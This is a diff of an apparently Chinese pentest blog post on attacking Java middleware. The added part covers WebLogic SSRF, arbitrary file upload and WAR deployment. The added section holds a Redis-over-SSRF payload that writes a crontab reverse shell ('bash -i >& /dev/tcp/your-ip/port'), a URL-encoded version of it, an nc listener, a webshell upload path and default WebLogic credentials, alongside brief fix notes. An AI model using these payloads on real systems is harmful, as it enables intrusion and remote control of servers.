@@ -51,8 +51,8 @@
                     </h1>
                     <h2 class="headline">
                     Mar 5, 2019 00:00
-                    · 2108 words
-                    · 5 minute read
+                    · 3045 words
+                    · 7 minute read
                       <span class="tags">
                       
                       
@@ -75,17 +75,20 @@
 <li><a href="#0x01-tomcat">0x01 Tomcat</a>
 <ul>
 <li><a href="#tomcat口令爆破">tomcat口令爆破</a></li>
-<li><a href="#war漏洞">war漏洞</a></li>
+<li><a href="#war">war</a></li>
 <li><a href="#远程代码执行">远程代码执行</a></li>
 </ul></li>
 <li><a href="#0x02-jboss">0x02 jBoss</a>
 <ul>
-<li><a href="#war漏洞-1">war漏洞</a></li>
-<li><a href="#反序列化漏洞">反序列化漏洞</a></li>
+<li><a href="#war-1">war</a></li>
+<li><a href="#反序列化">反序列化</a></li>
 </ul></li>
 <li><a href="#weblogic">WebLogic</a>
 <ul>
+<li><a href="#反序列化-1">反序列化</a></li>
 <li><a href="#ssrf">ssrf</a></li>
+<li><a href="#任意文件上传">任意文件上传</a></li>
+<li><a href="#war-2">war</a></li>
 </ul></li>
 </ul></li>
 </ul>
@@ -144,7 +147,7 @@ admin 123456
 
 <p>在默认不对tomcat做任何配置的时候爆破是无效的，而如果设置了账号密码就可以进行爆破。Tomcat的认证比较弱，Base64(用户名:密码)编码，请求响应码如果不是401（未经授权：访问由于凭据无效被拒绝。）即表示登录成功。登录成功后，可直接上传war文件，getshell（当然上传war文件需要manager权限）</p>
 
-<h3 id="war漏洞">war漏洞</h3>
+<h3 id="war">war</h3>
 
 <p>.jsp shell文件打包为war文件：</p>
 
@@ -210,7 +213,7 @@ admin 123456
 
 <p><a href="http://localhost:8080">http://localhost:8080</a></p>
 
-<h3 id="war漏洞-1">war漏洞</h3>
+<h3 id="war-1">war</h3>
 
 <p>访问管理页面，查看jboss配置页面中的JMX Console，这是JBoss的管理台程序，进入后找到Jboss.deployment包，该包下有flavor=URL.type=DeploymentSccanner选项。进入部署页面后便可以上传war文件，但与tomcat不同的是它不是本地上传war文件，而是从远程地址下载，因此需要自己准备一个文件服务器，用于远程下载war到目标jboss服务器上。具体方法是在部署页面找到”ADDURL”方法，输入URL地址，点击invoke。除了以上方法外，JMX-Console提供的BSH方法，同样也可以部署war包。</p>
 
@@ -222,7 +225,7 @@ admin 123456
 <li><p>删除jmx-console.war与web-console.war</p></li>
 </ul>
 
-<h3 id="反序列化漏洞">反序列化漏洞</h3>
+<h3 id="反序列化">反序列化</h3>
 
 <p><a href="http://localhost:8080/invoker/readonly">http://localhost:8080/invoker/readonly</a></p>
 
@@ -244,10 +247,88 @@ admin 123456
 
 <p>WebLogic是美国Oracle公司出品的一个applicationserver，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。安装完weblogic默认会监听7001端口</p>
 
+<h3 id="反序列化-1">反序列化</h3>
+
 <h3 id="ssrf">ssrf</h3>
 
 <pre><code>http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001
 </code></pre>
+
+<ol>
+<li><p>探测内网redis端口(6379)</p></li>
+
+<li><p>Redis反弹shell</p></li>
+</ol>
+
+<p>在Weblogic的SSRF中，有一个比较大的特点，就是虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p>
+
+<p>反弹shell脚本写入/etc/crontab</p>
+
+<pre><code>set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/your-ip/port 0&gt;&amp;1\n\n\n\n&quot;
+config set dir /etc/
+config set dbfilename crontab
+save    
+</code></pre>
+
+<p>因为我们是通过GET来发送命令的，因此要将上面的命令进行URL编码，同时我们还要制定一个要写入的文件，这里我就叫做test了，最终的URL如下：</p>
+
+<pre><code>?operator=http://172.21.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F8888%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
+</code></pre>
+
+<p>监听8888端口
+<code>nc -l 8888</code></p>
+
+<p>burp发包</p>
+
+<p><strong>漏洞修复</strong></p>
+
+<ol>
+<li><p>删除SearchPublicRegistries.jsp</p></li>
+
+<li><p>删除uddiexplorer文件夹,限制uddiexplorer应用
+只能内网访问</p></li>
+</ol>
+
+<h3 id="任意文件上传">任意文件上传</h3>
+
+<p>通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。</p>
+
+<p>访问 <a href="http://192.168.139.129:7001/ws_utc/config.do">http://192.168.139.129:7001/ws_utc/config.do</a></p>
+
+<p>设置Work Home Dir为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>, ws_utc 应用的静态文件css目录，访问这个目录是无需权限的</p>
+
+<p>然后点击安全 -&gt; 增加，然后上传 webshell ，上传一个 jsp 大马</p>
+
+<p>burp返回包或者f12查看时间戳</p>
+
+<p><a href="http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，webshell地址">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，webshell地址</a></p>
+
+<p><strong>漏洞修复</strong></p>
+
+<ol>
+<li>升级到最新版本</li>
+</ol>
+
+<h3 id="war-2">war</h3>
+
+<p>默认后台 :</p>
+
+<p><a href="http://localhost:7001/console/login/loginForm.jsp">http://localhost:7001/console/login/loginForm.jsp</a></p>
+
+<p>默认帐号:</p>
+
+<p>用户名密码均为：weblogic</p>
+
+<p>用户名密码均为：system</p>
+
+<p>用户名密码均为：portaladmin</p>
+
+<p>用户名密码均为：guest</p>
+
+<p>成功登陆weblogic后台后，找到部署按钮，点击后选择安装，然后可以选择本地上传war包也可以利用远程url下载，部署完成后，weblogic会给出文件地址</p>
+
+<p><strong>漏洞修复</strong>
+1. 删除远程部署</p>
 
                 </section>
             </article>
